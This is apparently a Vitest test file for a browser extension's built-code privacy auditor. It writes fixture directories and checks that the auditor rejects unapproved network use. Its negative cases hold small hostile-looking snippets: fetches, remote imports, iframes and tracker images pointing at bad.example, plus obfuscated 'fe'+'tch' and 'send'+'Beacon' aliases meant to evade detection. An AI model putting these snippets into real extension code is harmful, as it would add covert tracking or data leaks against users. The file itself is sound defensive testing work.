import { describe, expect, it } from "vitest";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const hosts = ["https://claude.ai/*", "https://chatgpt.com/*", "https://gemini.google.com/*"];
const selector = `
const DEFAULT_SELECTOR = "https://interlude-sepia.vercel.app/selectors/v1.json";
const SELECTOR_CACHE_KEY = "selector-cache";
async function fetchStaticJSON(url) {
  const target = new URL(url);
  if (target.protocol !== "https:" || target.username || target.password || target.search || target.hash) throw new Error("invalid");
  const controller = new AbortController();
  return fetch(target.href, { method: "GET", mode: "cors", credentials: "omit", referrerPolicy: "no-referrer", redirect: "error", signal: controller.signal });
}
async function runCheck(url) { return fetchStaticJSON(url); }
`;
const release = `const UPDATE_URL = "https://interlude-sepia.vercel.app/updates/latest.json";
async function runCheck() { return fetchStaticJSON(UPDATE_URL); }
`;
function fixture(): string {
  const dir = mkdtempSync(join(tmpdir(), "interlude-built-audit-"));
  writeFileSync(
    join(dir, "manifest.json"),
    JSON.stringify({
      manifest_version: 3,
      permissions: ["storage", "alarms"],
      host_permissions: hosts,
    }),
  );
  writeFileSync(join(dir, "selectors.js"), selector);
  writeFileSync(join(dir, "release.js"), release);
  return dir;
}
function workerFixture(): string {
  const dir = fixture();
  mkdirSync(join(dir, "chunks"));
  mkdirSync(join(dir, "assets"));
  writeFileSync(
    join(dir, "manifest.json"),
    JSON.stringify({
      manifest_version: 3,
      permissions: ["storage", "alarms"],
      host_permissions: hosts,
      web_accessible_resources: [{ resources: ["ai-worker-host.html"], matches: hosts }],
    }),
  );
  writeFileSync(
    join(dir, "ai-worker-host.html"),
    '<script type="module" src="./ai-worker-host.js"></script>',
  );
  writeFileSync(
    join(dir, "ai-worker-host.js"),
    'const origins = ["https://claude.ai", "https://chatgpt.com", "https://gemini.google.com"];',
  );
  writeFileSync(join(dir, "assets/search-worker-test.js"), "postMessage({ ok: true });");
  writeFileSync(
    join(dir, "chunks/worker-client-test.js"),
    `
    function searchInWorker() {
      return new Worker(new URL("" + new URL("../assets/search-worker-test.js", import.meta.url).href, import.meta.url), { type: "module" });
    }
  `,
  );
  writeFileSync(
    join(dir, "chunks/game-test.js"),
    `
    function searchInExtensionFrame() {
      const frame = document.createElement("iframe");
      frame.src = chrome.runtime.getURL("ai-worker-host.html");
      return frame;
    }
  `,
  );
  return dir;
}

function audit(dir: string) {
  return spawnSync("node", ["scripts/audit-built-privacy.mjs", dir], { encoding: "utf8" });
}

describe("built-extension privacy audit", () => {
  it("accepts the two documented transport paths", () => {
    const dir = fixture();
    try {
      expect(audit(dir).status).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
  it("allows only the packaged worker and extension-origin frame", () => {
    const dir = workerFixture();
    try {
      expect(audit(dir).status).toBe(0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  const workerCases: Array<[string, (dir: string) => void, string]> = [
    [
      "a remote worker",
      (dir) =>
        writeFileSync(
          join(dir, "chunks/worker-client-test.js"),
          'function searchInWorker() { return new Worker("https://bad.example/worker.js"); }',
        ),
      "forbidden network",
    ],
    [
      "a frame with a remote source",
      (dir) =>
        writeFileSync(
          join(dir, "chunks/game-test.js"),
          'function searchInExtensionFrame() { const frame = document.createElement("iframe"); frame.src = "https://bad.example/"; }',
        ),
      "unapproved resource",
    ],
    [
      "an extra iframe",
      (dir) => writeFileSync(join(dir, "evil.js"), 'document.createElement("iframe")'),
      "dynamic network element",
    ],
    [
      "a dynamic source attribute",
      (dir) => writeFileSync(join(dir, "evil.js"), 'node.setAttribute("src", "x")'),
      "dynamic resource attribute",
    ],
    [
      "a wildcard exposed resource",
      (dir) =>
        writeFileSync(
          join(dir, "manifest.json"),
          JSON.stringify({
            manifest_version: 3,
            permissions: ["storage", "alarms"],
            host_permissions: hosts,
            web_accessible_resources: [{ resources: ["*"], matches: hosts }],
          }),
        ),
      "unexpected web-accessible resource",
    ],
  ];
  it.each(workerCases)("rejects %s around the local worker", (_name, mutate, expected) => {
    const dir = workerFixture();
    try {
      mutate(dir);
      const result = audit(dir);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain(expected);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  const cases: Array<[string, (dir: string) => void, string]> = [
    [
      "an extra fetch",
      (dir) => writeFileSync(join(dir, "evil.js"), 'fetch("https://bad.example/")'),
      "fetch outside",
    ],
    [
      "a fetch alias",
      (dir) => writeFileSync(join(dir, "evil.js"), 'const f = globalThis["fe"+"tch"]; f("local")'),
      "computed fetch",
    ],
    [
      "XHR or a socket",
      (dir) => writeFileSync(join(dir, "evil.js"), "const Socket = WebSocket; new Socket('x')"),
      "forbidden network",
    ],
    [
      "a computed beacon",
      (dir) => writeFileSync(join(dir, "evil.js"), 'navigator["send"+"Beacon"]("x")'),
      "forbidden network",
    ],
    [
      "custom headers",
      (dir) =>
        writeFileSync(
          join(dir, "selectors.js"),
          selector.replace('method: "GET",', 'headers: {"X-ID": "123"}, method: "GET",'),
        ),
      "approved credential-free GET",
    ],
    [
      "a missing URL guard",
      (dir) => writeFileSync(join(dir, "selectors.js"), selector.replace("target.username ||", "")),
      "URL guard is missing",
    ],
    [
      "an extra transport call",
      (dir) => writeFileSync(join(dir, "evil.js"), 'function extra() { fetchStaticJSON("x"); }'),
      "extra or unapproved",
    ],
    [
      "analytics code",
      (dir) => writeFileSync(join(dir, "evil.js"), 'const vendor = "mixpanel"'),
      "analytics or telemetry",
    ],
    [
      "an external image",
      (dir) => writeFileSync(join(dir, "options.html"), '<img src="https://bad.example/tracker">'),
      "external resource",
    ],
    [
      "a remote module",
      (dir) => writeFileSync(join(dir, "evil.js"), 'import("https://bad.example/evil.js")'),
      "dynamic import",
    ],
    [
      "a preload with remote dependencies",
      (dir) =>
        writeFileSync(
          join(dir, "evil.js"),
          '__vitePreload(() => 1, ["https://bad.example/x"], import.meta.url)',
        ),
      "nonempty Vite preload",
    ],
    [
      "a new permission",
      (dir) =>
        writeFileSync(
          join(dir, "manifest.json"),
          JSON.stringify({
            manifest_version: 3,
            permissions: ["storage", "alarms", "tabs"],
            host_permissions: hosts,
          }),
        ),
      "permissions must be exactly",
    ],
    [
      "a new host permission",
      (dir) =>
        writeFileSync(
          join(dir, "manifest.json"),
          JSON.stringify({
            manifest_version: 3,
            permissions: ["storage", "alarms"],
            host_permissions: [...hosts, "<all_urls>"],
          }),
        ),
      "unexpected host permissions",
    ],
  ];
  it.each(cases)("rejects %s", (_name, mutate, expected) => {
    const dir = fixture();
    try {
      mutate(dir);
      const result = audit(dir);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain(expected);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
